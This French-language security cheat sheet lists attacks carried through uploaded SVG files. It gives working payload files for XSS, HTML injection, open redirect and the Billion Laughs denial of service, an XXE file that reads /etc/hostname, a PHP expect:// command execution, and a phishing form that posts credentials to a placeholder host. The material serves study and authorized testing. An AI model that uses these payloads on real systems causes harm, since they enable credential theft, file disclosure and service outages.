# SVG

**Facteur de risque** : XSS, XXE, HTML Injection, ,OpenRedirect, SSRF, DoS

**Extensions** : .svg, .svgz

**Type MIME** : image/svg+xml

**Description** : Le **Scalable Vector Graphics** ou **SVG**, est un format de données conçu pour décrire des ensembles de graphiques vectoriels et basé sur XML. Exemple :

```svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
</svg>
```

<img title="" src="XSS/xss.svg">

Des payloads peuvent être donc facilement être injecté dans le fichier SVG.

## Sommaire

- Cross-Site Scripting (XSS)

- HTML Injection

- XML External Entity (XXE)

- OpenRedirect

- Server-Side Request Forgery (SSRF)

- DoS : Billion Laughs

## Cross-Site Scripting (XSS)

### Pré-requis

- Le fichier doit être accessible après avoir été uploadé

### Attaque

Du code JavaScript peut être facilement ajouté dans le fichier SVG complet (ici, entre les balises `<script>`) :

**xss.svg**

```svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert(1);
   </script>
</svg>
```

Ou en plus court :

**xss\_1.svg**

```svg
<svg xmlns="http://www.w3.org/2000/svg">
    <script>alert(1);</script>
</svg>
```

**xss\_2.svg**

```svg
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

D'autres exemples de fichiers SVG contenant des payloads pour injection XSS sont présents sur [HTML5 Security Cheatsheet](https://html5sec.org/#svg).

## HTML Injection

### Pré-requis

- Le fichier doit être accessible après avoir été uploadé

### Attaque

Dans certaines contextes, le payload XSS peut être refusé. Mais l'injection de code HTML est toujours possible, à l'aide de `foreignObject`:

**html.svg**

```svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
    <foreignObject class="node" width="600" height="600">
        <body xmlns="http://www.w3.org/1999/xhtml">
            <style>
                h1 {color: green}
            </style>
            <h1>HTML Injection</h1>
        </body>
    </foreignObject>
</svg>
```

Pourvoir exécuter de l'HTML permet à un attaqueur d'effectuer du **phishing**, contourner le CSP (**CSP bypass**) etc.

Un exemple pour le phishing :

**html\_phishing.svg**

```svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
    <foreignObject class="node" width="600" height="600">
        <body xmlns="http://www.w3.org/1999/xhtml">
            <style>
                h1 {color: green}
            </style>
            <h1>HTML Injection : Phishing</h1>
               <b>Entrez vos identifiants :</b>
            <form action="http://xxx.xxx.xxx.xxx:1234" method="GET">
                <input type="text" name="email" placeholder="Email"/>
                <input type="password" name="password" placeholder="Mot de passe"/>
                <input type="submit" value="Submit"/>
            </form>
        </body>
    </foreignObject>
</svg>
```

## XML External Entity (XXE)

### Pré-requis

- Le fichier doit être accessible après avoir été uploadé

- Le fichier doit être traité par le serveur

- L'utilisation de wrapper PHP est possible que si le serveur tourne sous PHP

### Attaque

Comme les fichiers SVG sont basés sur du XML, une XXE est possible.

Pour récupérer un fichier (ici `/etc/hostname`) :

**xxe\_file.svg** (https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)

```svg
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>

<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Pour exécuter une commande (ici `ls`) à l'aide de wrapper de PHP `expect`:

**xxe\_command.svg** 

```svg
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```

## OpenRedirect

### Pré-requis

- Le fichier doit être accessible après avoir été uploadé

### Attaque

Comme une XSS injection est possible avec les fichier SVG, une Open Redirect l'est également. Le code suivant permet une redirection sur google.com :

```svg
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg onload="window.location='http://www.google.com'" xmlns="http://www.w3.org/2000/svg">
</svg>
```

## Server-Side Request Forgery (SSRF)

### Pré-requis

- Le fichier doit être accessible après avoir été uploadé

### Attaque

A regarder 

- [GitHub - allanlw/svg-cheatsheet: A cheatsheet for exploiting server-side SVG processors.](https://github.com/allanlw/svg-cheatsheet)

- https://twitter.com/wugeej/status/1138639681543819264

- https://twitter.com/ArbazKiraak/status/1100596327061188609?s=19&fbclid=IwAR32yGcg8v4AHSOJFWvJdyA-D5W29zOtV26cTPHFnoJQ_i3ul0Vyho_ntP0

- https://gowsundar.gitbook.io/book-of-bugbounty-tips/ssrf

## Denial of Service : Billion Laughs

### Pré-requis

- Le fichier doit être accessible après avoir été uploadé

### Attaque

Le Billion Laughs, qui vise le parser des documents en XML, est applicable au fichier SVG : 

```svg
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE svg [
<!ENTITY lol "lol">
<!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<svg>
    <lolz>&lol9;</lolz>
</svg>
```

## References

- Anatomy of Scalable Vector Graphics (SVG) Attack Surface on the Web : https://www.fortinet.com/blog/threat-research/scalable-vector-graphics-attack-surface-anatomy

- SVG - Exploiting Browsers without Image Parsing Bugs : https://www.blackhat.com/docs/us-14/materials/us-14-DeGraaf-SVG-Exploiting-Browsers-Without-Image-Parsing-Bugs.pdf

- XSS
  
  - Scalable Vector Graphics and XSS - Grepular : https://www.grepular.com/Scalable_Vector_Graphics_and_XSS
  
  - Do you allow to load SVG files? You have XSS! : https://research.securitum.com/do-you-allow-to-load-svg-files-you-have-xss/
  
  - The Image that called me (Active Content Injection with SVG Files) : https://owasp.org/www-pdf-archive/Mario_Heiderich_OWASP_Sweden_The_image_that_called_me.pdf
  
  - Vectors embedded in SVG files : https://html5sec.org/#svg
  
  - PayloadsAllTheThings - XSS Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-files
  
  - Protecting against XSS in SVG : https://digi.ninja/blog/svg_xss.php

- XXE
  
  - PayloadsAllTheThings - XXE Injection : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#xxe-inside-svg
  
  - Lab: Exploiting XXE via image file upload | Web Security Academy : https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload
  
  - SVG - File Upload : https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#svg-file-upload
  
  - XXE Injection in Apache Batik Library [CVE-2015-0250] : https://insinuator.net/2015/03/xxe-injection-in-apache-batik-library-cve-2015-0250/
  
  - Exploitation: XML External Entity (XXE) Injection : https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection

## Todo
